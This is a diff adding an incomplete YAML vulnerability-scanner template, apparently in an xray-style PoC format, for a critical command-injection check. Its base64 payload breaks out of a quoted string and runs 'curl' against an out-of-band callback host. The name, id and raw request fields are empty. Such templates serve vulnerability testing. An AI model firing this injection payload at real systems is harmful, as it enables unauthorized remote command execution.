@@ -1,0 +1,27 @@
+id: 
+info:
+  name:
+  severity: critical
+  author: 
+
+set:
+  oob: oob()
+  oobHTTP: oob.HTTP
+  oobDNS: oob.DNS
+  s1: randomLowercase(8)
+  base64payload: base64("\';curl " + oobHTTP + " %23")
+rules:
+  r0:
+    request:
+      raw: |-
+    expression: response.status == 200
+
+    output:
+      search: |-
+        "(?P<rfile>\\w+.jsp)".bsubmatch(response.body)
+      rfile: search["rfile"]
+      search1: |-
+        "(?P<rdir>ico.*jsp)".bsubmatch(response.body)
+      rdir: search["rdir"]
+
+expression: r0()
